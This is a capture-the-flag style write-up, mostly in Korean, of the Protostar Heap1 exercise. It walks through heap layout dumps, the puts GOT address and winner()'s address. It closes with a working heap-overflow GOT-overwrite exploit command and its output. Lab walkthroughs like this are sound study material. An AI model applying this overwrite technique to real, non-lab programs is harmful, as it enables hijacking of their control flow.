# Wargame / Protostar / Heap1

[Protostar Heap1 - Exploit Exercises](https://exploit-exercises.com/protostar/heap1/)

>This level takes a look at code flow hijacking in data overwrite cases.
>This level is at /opt/protostar/bin/heap1


## Source

```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <sys/types.h>

struct internet {
  int priority;
  char *name;
};

void winner()
{
  printf("and we have a winner @ %d\n", time(NULL));
}

int main(int argc, char **argv)
{
  struct internet *i1, *i2, *i3;

  i1 = malloc(sizeof(struct internet));
  i1->priority = 1;
  i1->name = malloc(8);

  i2 = malloc(sizeof(struct internet));
  i2->priority = 2;
  i2->name = malloc(8);

  strcpy(i1->name, argv[1]);
  strcpy(i2->name, argv[2]);

  printf("and that's a wrap folks!\n");
}
```


## Initial execution

```bash
$ ./heap1
Segmentation fault (core dumped)

$ ./heap1 AAAA BBBB
and that's a wrap folks!

$ ltrace ./heap1 AAAA BBBB
__libc_start_main(0x80484b9, 3, 0xffffcdd4, 0x8048580 <unfinished ...>
malloc(8)                                                                                   = 0x804a008
malloc(8)                                                                                   = 0x804a018
malloc(8)                                                                                   = 0x804a028
malloc(8)                                                                                   = 0x804a038
strcpy(0x804a018, "AAAA")                                                                   = 0x804a018
strcpy(0x804a038, "BBBB")                                                                   = 0x804a038
puts("and that's a wrap folks!"and that's a wrap folks!
)                                                            = 25
+++ exited (status 25) +++
```


## Analysis

```
i1 =       0x0804a008
i1->name = 0x0804a018

i2 =       0x0804a028
i2->name = 0x0804a038
```


```
gef➤  x/50x 0x804a000
0x804a000:      0x00000000      0x00000011      0x00000001      0x0804a018
0x804a010:      0x00000000      0x00000011      0x41414141      0x00000000
0x804a020:      0x00000000      0x00000011      0x00000002      0x0804a038
0x804a030:      0x00000000      0x00000011      0x42424242      0x00000000
0x804a040:      0x00000000      0x00020fc1      0x00000000      0x00000000
0x804a050:      0x00000000      0x00000000      0x00000000      0x00000000
```

`pwndbg` 는 `heap` 명령어도 heap 상황을 print 해주는 명령어가 있군요.

```
pwndbg> heap
Top Chunk: 0x804a040
Last Remainder: 0

0x804a000 FASTBIN {
  prev_size = 0,
  size = 17,
  fd = 0x1,
  bk = 0x804a018,
  fd_nextsize = 0x0,
  bk_nextsize = 0x11
}
0x804a010 FASTBIN {
  prev_size = 0,
  size = 17,
  fd = 0x41414141,
  bk = 0x0,
  fd_nextsize = 0x0,
  bk_nextsize = 0x11
}
0x804a020 FASTBIN {
  prev_size = 0,
  size = 17,
  fd = 0x2,
  bk = 0x804a038,
  fd_nextsize = 0x0,
  bk_nextsize = 0x11
}
0x804a030 FASTBIN {
  prev_size = 0,
  size = 17,
  fd = 0x42424242,
  bk = 0x0,
  fd_nextsize = 0x0,
  bk_nextsize = 0x20fc1
}
0x804a040 PREV_INUSE {
  prev_size = 0,
  size = 135105,
  fd = 0x0,
  bk = 0x0,
  fd_nextsize = 0x0,
  bk_nextsize = 0x0
}
```

`strcpy(i2->name, argv[2]);` 수행 시에 입력 값을 `i2->name` 으로 alloc 받은 pointer 로 copy 를 하게 된다. 이 값을 `printf` 함수의 GOT 값으로 설정을 하고, 입력 값을 `winner()` 함수 주소로 넣어다면 `printf()` 함수 수행 시에 `winner()` 함수가 수행될 것이다. 


#### `printf` 의 GOT 주소 확인 : `0x08049774`

Exploit 할 마지막 `printf` 포함된 assem code 를 보면 아래와 같이 `puts` 로 대치되어 있다. argument 별로 없는 짧은 경우 `printf` 가 `puts` 로 compile 된다고 들은 것 같다.

```
   0x08048552 <+153>:   mov    DWORD PTR [esp],eax
   0x08048555 <+156>:   call   0x804838c <strcpy@plt>
   0x0804855a <+161>:   mov    DWORD PTR [esp],0x804864b
   0x08048561 <+168>:   call   0x80483cc <puts@plt>
   0x08048566 <+173>:   leave
   0x08048567 <+174>:   ret
```


```
pwndbg> got
[*] '/media/psf/Home/_2O2L2H/github/awesome-ctf-wargame/wargame/protostar/heap/heap1/heap1'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments

GOT protection: No RELRO | GOT functions: 7

[0804975c] __gmon_start__ -> 0x8048372 (__gmon_start__@plt+6) ◂— push   0 /* 'h' */
[08049760] __libc_start_main@GLIBC_2.0 -> 0x8048382 (__libc_start_main@plt+6) ◂— push   8
[08049764] strcpy@GLIBC_2.0 -> 0x8048392 (strcpy@plt+6) ◂— push   0x10
[08049768] printf@GLIBC_2.0 -> 0x80483a2 (printf@plt+6) ◂— push   0x18
[0804976c] time@GLIBC_2.0 -> 0x80483b2 (time@plt+6) ◂— push   0x20 /* 'h ' */
[08049770] malloc@GLIBC_2.0 -> 0x80483c2 (malloc@plt+6) ◂— push   0x28 /* 'h(' */
[08049774] puts@GLIBC_2.0 -> 0x80483d2 (puts@plt+6) ◂— push   0x30 /* 'h0' */
```


#### `winner()` 함수 주소 확인 : `0x8048494`

```
pwndbg> p winner
$1 = {void (void)} 0x8048494 <winner>
```



## Exploit

```bash
$ ./heap1 $(python -c 'print "AAAA" * 5 + "\x74\x97\x04\x08"') $(python -c 'print "\x94\x84\x04\x08"')
and we have a winner @ 1497206645
```

